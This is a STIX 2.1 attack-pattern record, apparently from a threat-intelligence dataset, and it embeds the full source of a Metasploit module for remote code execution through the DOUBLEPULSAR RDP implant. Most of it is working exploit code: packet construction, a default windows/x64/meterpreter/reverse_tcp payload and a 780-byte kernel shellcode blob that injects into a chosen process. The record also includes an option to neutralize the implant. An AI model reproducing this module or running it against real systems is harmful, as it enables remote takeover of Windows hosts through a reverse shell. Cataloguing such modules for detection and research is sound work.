{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--20c05e7a-74fd-4d20-8ce4-318a7d2427db",
    "created": "2024-08-14T16:35:14.07995Z",
    "modified": "2024-08-14T16:35:14.079954Z",
    "name": "RDP DOUBLEPULSAR Remote Code Execution",
    "description": " This module executes a Metasploit payload against the Equation Group's DOUBLEPULSAR implant for RDP.  While this module primarily performs code execution against the implant the \"Neutralize implant\" target allows you to disable the implant. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/rdp/rdp_doublepulsar_rce.rb",
            "external_id": "rdp_doublepulsar_rce.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/countercept/doublepulsar-detection-script"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::RDP\n\n  MAX_SHELLCODE_SIZE = 4096\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'               => 'RDP DOUBLEPULSAR Remote Code Execution',\n      'Description'        => %q{\n        This module executes a Metasploit payload against the Equation Group's\n        DOUBLEPULSAR implant for RDP.\n\n        While this module primarily performs code execution against the implant,\n        the \"Neutralize implant\" target allows you to disable the implant.\n      },\n      'Author'             => [\n        'Equation Group',  # DOUBLEPULSAR implant\n        'Shadow Brokers',  # Equation Group dump\n        'Luke Jennings',   # DOPU analysis and detection\n        'wvu',             # RDP DOPU analysis and module\n        'Tom Sellers',     # RDP DOPU analysis\n        'Spencer McIntyre' # RDP DOPU analysis\n      ],\n      'References'         => [\n        ['URL', 'https://github.com/countercept/doublepulsar-detection-script']\n      ],\n      'DisclosureDate'     => '2017-04-14', # Shadow Brokers leak\n      'License'            => MSF_LICENSE,\n      'Platform'           => 'win',\n      'Arch'               => ARCH_X64,\n      'Privileged'         => true,\n      'Payload'            => {\n        'Space'            => MAX_SHELLCODE_SIZE - kernel_shellcode_size,\n        'DisableNops'      => true\n      },\n      'Targets'            => [\n        ['Execute payload (x64)',\n          'DefaultOptions' => {\n            'EXITFUNC'     => 'thread',\n            'PAYLOAD'      => 'windows/x64/meterpreter/reverse_tcp'\n          }\n        ],\n        ['Neutralize implant',\n          'DefaultOptions' => {\n            'PAYLOAD'      => nil # XXX: \"Unset\" generic payload\n          }\n        ]\n      ],\n      'DefaultTarget'      => 0,\n      'Notes'              => {\n        'AKA'              => ['DOUBLEPULSAR'],\n        'RelatedModules'   => ['exploit/windows/smb/smb_doublepulsar_rce'],\n        'Stability'        => [CRASH_OS_DOWN],\n        'Reliability'      => [REPEATABLE_SESSION],\n        'SideEffects'      => []\n      }\n    ))\n\n    register_advanced_options([\n      OptBool.new('DefangedMode',  [true, 'Run in defanged mode', true]),\n      OptString.new('ProcessName', [true, 'Process to inject payload into', 'spoolsv.exe'])\n    ])\n  end\n\n  OPCODES = {\n    exec: 0x01,\n    ping: 0x02,\n    burn: 0x03\n  }.freeze\n\n  DOUBLEPULSAR_MAGIC = 0x19283744\n\n  # https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_osversioninfoexw\n  def parse_doublepulsar_ping(res)\n    return unless res && res.length == 288\n\n    magic,    _size,     major,   minor, build = res.unpack('V5')\n    sp_major, _sp_minor, _suites, prod,  arch  = res[-8..-1].unpack('v3C2')\n\n    return unless magic == DOUBLEPULSAR_MAGIC\n\n    ver_str = \"#{major}.#{minor}.#{build}\"\n    sp_str  = \"SP#{sp_major}\"\n\n    prod_str =\n      case prod\n      when 1\n        'Workstation'\n      when 2\n        'Domain Controller'\n      when 3\n        'Server'\n      end\n\n    arch_str =\n      case arch\n      when 1\n        'x86'\n      when 2\n        'x64'\n      end\n\n    \"Windows #{prod_str} #{ver_str} #{sp_str} #{arch_str}\"\n  end\n\n  def setup\n    super\n\n    rdp_connect\n    is_rdp, server_selected_protocol = rdp_check_protocol\n\n    fail_with(Failure::BadConfig, 'Target port is not RDP') unless is_rdp\n\n    case server_selected_protocol\n    when RDPConstants::PROTOCOL_HYBRID, RDPConstants::PROTOCOL_HYBRID_EX\n      fail_with(Failure::BadConfig, 'DOUBLEPULSAR does not support NLA')\n    when RDPConstants::PROTOCOL_SSL\n      vprint_status('Swapping plain socket to SSL')\n      swap_sock_plain_to_ssl\n    end\n  rescue Rex::ConnectionError, RdpCommunicationError => e\n    fail_with(Failure::Disconnected, e.message)\n  end\n\n  def cleanup\n    rdp_disconnect\n\n    super\n  end\n\n  def check\n    print_status('Sending ping to DOUBLEPULSAR')\n    res = do_rdp_doublepulsar_pkt(OPCODES[:ping])\n\n    unless (info = parse_doublepulsar_ping(res))\n      print_error('DOUBLEPULSAR not detected or disabled')\n      return CheckCode::Safe\n    end\n\n    print_warning('DOUBLEPULSAR RDP IMPLANT DETECTED!!!')\n    print_good(\"Target is #{info}\")\n    CheckCode::Vulnerable\n  end\n\n  def exploit\n    if datastore['DefangedMode']\n      warning = <<~EOF\n\n\n        Are you SURE you want to execute code against a nation-state implant?\n        You MAY contaminate forensic evidence if there is an investigation.\n\n        Disable the DefangedMode option if you have authorization to proceed.\n      EOF\n\n      fail_with(Failure::BadConfig, warning)\n    end\n\n    # No ForceExploit because check is accurate\n    unless check == CheckCode::Vulnerable\n      fail_with(Failure::NotVulnerable, 'Unable to proceed without DOUBLEPULSAR')\n    end\n\n    case target.name\n    when 'Execute payload (x64)'\n      print_status(\"Generating kernel shellcode with #{datastore['PAYLOAD']}\")\n      shellcode = make_kernel_user_payload(payload.encoded, datastore['ProcessName'])\n      shellcode << rand_text(MAX_SHELLCODE_SIZE - shellcode.length)\n      vprint_status(\"Total shellcode length: #{shellcode.length} bytes\")\n\n      print_status('Sending shellcode to DOUBLEPULSAR')\n      res = do_rdp_doublepulsar_pkt(OPCODES[:exec], shellcode)\n    when 'Neutralize implant'\n      return neutralize_implant\n    end\n\n    if res\n      fail_with(Failure::UnexpectedReply, 'Unexpected response from implant')\n    end\n\n    print_good('Payload execution successful')\n  end\n\n  def neutralize_implant\n    print_status('Neutralizing DOUBLEPULSAR')\n    res = do_rdp_doublepulsar_pkt(OPCODES[:burn])\n\n    if res\n      fail_with(Failure::UnexpectedReply, 'Unexpected response from implant')\n    end\n\n    print_good('Implant neutralization successful')\n  end\n\n  def do_rdp_doublepulsar_pkt(opcode = OPCODES[:ping], body = nil)\n    rdp_send_recv(make_rdp_mcs_doublepulsar(opcode, body))\n  rescue Errno::ECONNRESET, RdpCommunicationError\n    nil\n  end\n\n=begin\n  MULTIPOINT-COMMUNICATION-SERVICE T.125\n      DomainMCSPDU: channelJoinConfirm (15)\n          channelJoinConfirm\n              result: rt-domain-not-hierarchical (2)\n              initiator: 14120\n              requested: 6402\n=end\n  def make_rdp_mcs_doublepulsar(opcode, body)\n    data  = \"\\x3c\" # channelJoinConfirm\n    data << [DOUBLEPULSAR_MAGIC].pack('V')\n    data << [opcode].pack('v')\n\n    if body\n      data << [body.length, body.length, 0].pack('V*')\n      data << body\n    end\n\n    build_data_tpdu(data)\n  end\n\n  # ring3 = user mode encoded payload\n  # proc_name = process to inject APC into\n  def make_kernel_user_payload(ring3, proc_name)\n    sc = make_kernel_shellcode(proc_name)\n\n    sc << [ring3.length].pack('S<')\n    sc << ring3\n\n    sc\n  end\n\n  def generate_process_hash(process)\n    # x64_calc_hash from external/source/shellcode/windows/multi_arch_kernel_queue_apc.asm\n    proc_hash = 0\n    process << \"\\x00\"\n\n    process.each_byte do |c|\n      proc_hash = ror(proc_hash, 13)\n      proc_hash += c\n    end\n\n    [proc_hash].pack('l<')\n  end\n\n  def ror(dword, bits)\n    (dword >> bits | dword << (32 - bits)) & 0xFFFFFFFF\n  end\n\n  def make_kernel_shellcode(proc_name)\n    # see: external/source/shellcode/windows/multi_arch_kernel_queue_apc.asm\n    # Length: 780 bytes\n    \"\\x31\\xc9\\x41\\xe2\\x01\\xc3\\x56\\x41\\x57\\x41\\x56\\x41\\x55\\x41\\x54\\x53\" \\\n    \"\\x55\\x48\\x89\\xe5\\x66\\x83\\xe4\\xf0\\x48\\x83\\xec\\x20\\x4c\\x8d\\x35\\xe3\" \\\n    \"\\xff\\xff\\xff\\x65\\x4c\\x8b\\x3c\\x25\\x38\\x00\\x00\\x00\\x4d\\x8b\\x7f\\x04\" \\\n    \"\\x49\\xc1\\xef\\x0c\\x49\\xc1\\xe7\\x0c\\x49\\x81\\xef\\x00\\x10\\x00\\x00\\x49\" \\\n    \"\\x8b\\x37\\x66\\x81\\xfe\\x4d\\x5a\\x75\\xef\\x41\\xbb\\x5c\\x72\\x11\\x62\\xe8\" \\\n    \"\\x18\\x02\\x00\\x00\\x48\\x89\\xc6\\x48\\x81\\xc6\\x08\\x03\\x00\\x00\\x41\\xbb\" \\\n    \"\\x7a\\xba\\xa3\\x30\\xe8\\x03\\x02\\x00\\x00\\x48\\x89\\xf1\\x48\\x39\\xf0\\x77\" \\\n    \"\\x11\\x48\\x8d\\x90\\x00\\x05\\x00\\x00\\x48\\x39\\xf2\\x72\\x05\\x48\\x29\\xc6\" \\\n    \"\\xeb\\x08\\x48\\x8b\\x36\\x48\\x39\\xce\\x75\\xe2\\x49\\x89\\xf4\\x31\\xdb\\x89\" \\\n    \"\\xd9\\x83\\xc1\\x04\\x81\\xf9\\x00\\x00\\x01\\x00\\x0f\\x8d\\x66\\x01\\x00\\x00\" \\\n    \"\\x4c\\x89\\xf2\\x89\\xcb\\x41\\xbb\\x66\\x55\\xa2\\x4b\\xe8\\xbc\\x01\\x00\\x00\" \\\n    \"\\x85\\xc0\\x75\\xdb\\x49\\x8b\\x0e\\x41\\xbb\\xa3\\x6f\\x72\\x2d\\xe8\\xaa\\x01\" \\\n    \"\\x00\\x00\\x48\\x89\\xc6\\xe8\\x50\\x01\\x00\\x00\\x41\\x81\\xf9\" +\n    generate_process_hash(proc_name.upcase) +\n    \"\\x75\\xbc\\x49\\x8b\\x1e\\x4d\\x8d\\x6e\\x10\\x4c\\x89\\xea\\x48\\x89\\xd9\" \\\n    \"\\x41\\xbb\\xe5\\x24\\x11\\xdc\\xe8\\x81\\x01\\x00\\x00\\x6a\\x40\\x68\\x00\\x10\" \\\n    \"\\x00\\x00\\x4d\\x8d\\x4e\\x08\\x49\\xc7\\x01\\x00\\x10\\x00\\x00\\x4d\\x31\\xc0\" \\\n    \"\\x4c\\x89\\xf2\\x31\\xc9\\x48\\x89\\x0a\\x48\\xf7\\xd1\\x41\\xbb\\x4b\\xca\\x0a\" \\\n    \"\\xee\\x48\\x83\\xec\\x20\\xe8\\x52\\x01\\x00\\x00\\x85\\xc0\\x0f\\x85\\xc8\\x00\" \\\n    \"\\x00\\x00\\x49\\x8b\\x3e\\x48\\x8d\\x35\\xe9\\x00\\x00\\x00\\x31\\xc9\\x66\\x03\" \\\n    \"\\x0d\\xd7\\x01\\x00\\x00\\x66\\x81\\xc1\\xf9\\x00\\xf3\\xa4\\x48\\x89\\xde\\x48\" \\\n    \"\\x81\\xc6\\x08\\x03\\x00\\x00\\x48\\x89\\xf1\\x48\\x8b\\x11\\x4c\\x29\\xe2\\x51\" \\\n    \"\\x52\\x48\\x89\\xd1\\x48\\x83\\xec\\x20\\x41\\xbb\\x26\\x40\\x36\\x9d\\xe8\\x09\" \\\n    \"\\x01\\x00\\x00\\x48\\x83\\xc4\\x20\\x5a\\x59\\x48\\x85\\xc0\\x74\\x18\\x48\\x8b\" \\\n    \"\\x80\\xc8\\x02\\x00\\x00\\x48\\x85\\xc0\\x74\\x0c\\x48\\x83\\xc2\\x4c\\x8b\\x02\" \\\n    \"\\x0f\\xba\\xe0\\x05\\x72\\x05\\x48\\x8b\\x09\\xeb\\xbe\\x48\\x83\\xea\\x4c\\x49\" \\\n    \"\\x89\\xd4\\x31\\xd2\\x80\\xc2\\x90\\x31\\xc9\\x41\\xbb\\x26\\xac\\x50\\x91\\xe8\" \\\n    \"\\xc8\\x00\\x00\\x00\\x48\\x89\\xc1\\x4c\\x8d\\x89\\x80\\x00\\x00\\x00\\x41\\xc6\" \\\n    \"\\x01\\xc3\\x4c\\x89\\xe2\\x49\\x89\\xc4\\x4d\\x31\\xc0\\x41\\x50\\x6a\\x01\\x49\" \\\n    \"\\x8b\\x06\\x50\\x41\\x50\\x48\\x83\\xec\\x20\\x41\\xbb\\xac\\xce\\x55\\x4b\\xe8\" \\\n    \"\\x98\\x00\\x00\\x00\\x31\\xd2\\x52\\x52\\x41\\x58\\x41\\x59\\x4c\\x89\\xe1\\x41\" \\\n    \"\\xbb\\x18\\x38\\x09\\x9e\\xe8\\x82\\x00\\x00\\x00\\x4c\\x89\\xe9\\x41\\xbb\\x22\" \\\n    \"\\xb7\\xb3\\x7d\\xe8\\x74\\x00\\x00\\x00\\x48\\x89\\xd9\\x41\\xbb\\x0d\\xe2\\x4d\" \\\n    \"\\x85\\xe8\\x66\\x00\\x00\\x00\\x48\\x89\\xec\\x5d\\x5b\\x41\\x5c\\x41\\x5d\\x41\" \\\n    \"\\x5e\\x41\\x5f\\x5e\\xc3\\xe9\\xb5\\x00\\x00\\x00\\x4d\\x31\\xc9\\x31\\xc0\\xac\" \\\n    \"\\x41\\xc1\\xc9\\x0d\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\\x01\\xc1\\x38\\xe0\\x75\" \\\n    \"\\xec\\xc3\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\\x18\\x48\\x8b\\x52\" \\\n    \"\\x20\\x48\\x8b\\x12\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\\x45\\x31\\xc9\" \\\n    \"\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\" \\\n    \"\\xe2\\xee\\x45\\x39\\xd9\\x75\\xda\\x4c\\x8b\\x7a\\x20\\xc3\\x4c\\x89\\xf8\\x41\" \\\n    \"\\x51\\x41\\x50\\x52\\x51\\x56\\x48\\x89\\xc2\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x8b\" \\\n    \"\\x80\\x88\\x00\\x00\\x00\\x48\\x01\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\\x20\" \\\n    \"\\x49\\x01\\xd0\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\\x01\\xd6\\xe8\\x78\\xff\" \\\n    \"\\xff\\xff\\x45\\x39\\xd9\\x75\\xec\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\" \\\n    \"\\x41\\x8b\\x0c\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\" \\\n    \"\\x01\\xd0\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5b\\x41\\x53\\xff\\xe0\\x56\" \\\n    \"\\x41\\x57\\x55\\x48\\x89\\xe5\\x48\\x83\\xec\\x20\\x41\\xbb\\xda\\x16\\xaf\\x92\" \\\n    \"\\xe8\\x4d\\xff\\xff\\xff\\x31\\xc9\\x51\\x51\\x51\\x51\\x41\\x59\\x4c\\x8d\\x05\" \\\n    \"\\x1a\\x00\\x00\\x00\\x5a\\x48\\x83\\xec\\x20\\x41\\xbb\\x46\\x45\\x1b\\x22\\xe8\" \\\n    \"\\x68\\xff\\xff\\xff\\x48\\x89\\xec\\x5d\\x41\\x5f\\x5e\\xc3\"\n  end\n\n  def kernel_shellcode_size\n    make_kernel_shellcode('').length\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2017-04-14, # Shadow Brokers leak",
    "x_mitre_platforms": [
        "win'"
    ]
}